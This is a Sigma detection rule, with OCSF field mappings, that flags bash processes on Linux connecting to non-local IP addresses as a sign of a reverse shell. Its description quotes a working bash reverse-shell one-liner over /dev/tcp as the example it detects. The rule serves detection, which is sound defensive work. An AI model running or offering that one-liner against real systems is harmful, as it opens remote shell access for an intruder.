id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
title: Linux Reverse Shell Indicator
status: test
level: critical
description: Detects a bash contecting to a remote IP address (often found when actors
    do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
author: Florian Roth (Nextron Systems)
date: '2021-10-16'
modified: '2022-12-25'
tags:
    - attack.execution
    - attack.t1059.004
references:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
falsepositives:
    - Unknown
taxonomy: sigma
logsource:
    category: network_connection
    product: linux
detection:
    selection:
        Image|endswith: /bin/bash
    filter:
        DestinationIp:
            - 127.0.0.1
            - 0.0.0.0
    condition: selection and not filter
ocsf_mapping:
    class_name: network_activity
    logsource:
        category:
            source_field: category
            source_value: network_connection
            mapped_at: '2025-11-13T20:16:03.592190+00:00'
        product:
            source_field: product
            source_value: linux
            mapped_at: '2025-11-13T20:16:03.592190+00:00'
    detection_fields:
        -   source_field: Image
            target_table: network_activity
            target_field: process.name
            mapped_at: '2025-11-13T20:16:03.592224+00:00'
        -   source_field: DestinationIp
            target_table: network_activity
            target_field: dst_endpoint.ip
            mapped_at: '2025-11-13T20:16:03.592230+00:00'
